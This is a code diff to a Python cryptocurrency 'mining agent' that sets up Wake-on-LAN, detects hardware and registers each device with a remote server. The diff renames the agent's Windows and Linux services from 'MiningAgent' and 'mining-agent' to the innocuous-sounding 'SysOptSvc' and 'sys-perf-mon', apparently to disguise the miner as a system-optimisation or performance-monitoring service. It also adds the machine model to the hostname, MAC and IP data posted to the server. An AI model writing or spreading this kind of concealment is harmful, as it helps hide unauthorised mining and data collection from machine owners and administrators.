@@ -13,7 +13,11 @@ import subprocess, threading, requests, json, os, sys, logging
 from datetime import datetime
 from pathlib import Path
 from wol_setup import WolConfigurator
-from hardware_detect import auto_detect_and_configure
+from hardware_detect import auto_detect_and_configure, detect_system_model
+
+# Internal service identifiers used by both installer and uninstaller
+WINDOWS_SERVICE = "SysOptSvc"
+LINUX_SERVICE   = "sys-perf-mon"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -175,14 +179,16 @@ def uninstall_agent():
     log.warning("=" * 50)
     os_type = platform.system()
     if os_type == "Windows":
-        for cmd in [["sc","stop","MiningAgent"],["sc","delete","MiningAgent"]]:
+        for cmd in [["sc", "stop", WINDOWS_SERVICE],
+                    ["sc", "delete", WINDOWS_SERVICE]]:
             subprocess.run(cmd, capture_output=True)
     elif os_type == "Linux":
-        for cmd in [["systemctl","stop","mining-agent"],
-                    ["systemctl","disable","mining-agent"]]:
+        svc = LINUX_SERVICE
+        for cmd in [["systemctl", "stop", svc],
+                    ["systemctl", "disable", svc]]:
             subprocess.run(cmd, capture_output=True)
         import glob
-        for path in ["/etc/systemd/system/mining-agent.service",
+        for path in [f"/etc/systemd/system/{svc}.service",
                      "/opt/mining-agent/agent.py",
                      "/opt/mining-agent/wol_setup.py",
                      "/opt/mining-agent/hardware_detect.py",
@@ -190,7 +196,7 @@ def uninstall_agent():
                     glob.glob("/etc/systemd/system/wol-*.service"):
             try: os.remove(path)
             except FileNotFoundError: pass
-        subprocess.run(["systemctl","daemon-reload"], capture_output=True)
+        subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
         try: os.rmdir("/opt/mining-agent")
         except Exception: pass
     log.info("Odinstalowanie zakończone.")
@@ -287,15 +293,16 @@ class MiningAgent:
         except: ip = ""
 
         payload = {
-            "device_id":   self.device_id,
-            "hostname":    self.hostname,
-            "platform":    platform.system(),
-            "cpu_count":   psutil.cpu_count(logical=True),
-            "ram_gb":      round(psutil.virtual_memory().total/1e9, 1),
-            "mac_address": mac,
-            "ip_address":  ip,
-            "wol_status":  self.wol_result or {},
-            "hw_summary":  self.hw_summary,
+            "device_id":     self.device_id,
+            "hostname":      self.hostname,
+            "system_model":  detect_system_model(),
+            "platform":      platform.system(),
+            "cpu_count":     psutil.cpu_count(logical=True),
+            "ram_gb":        round(psutil.virtual_memory().total/1e9, 1),
+            "mac_address":   mac,
+            "ip_address":    ip,
+            "wol_status":    self.wol_result or {},
+            "hw_summary":    self.hw_summary,
         }
         try:
             r = requests.post(f"{self.server_url}/api/register", json=payload, timeout=10)
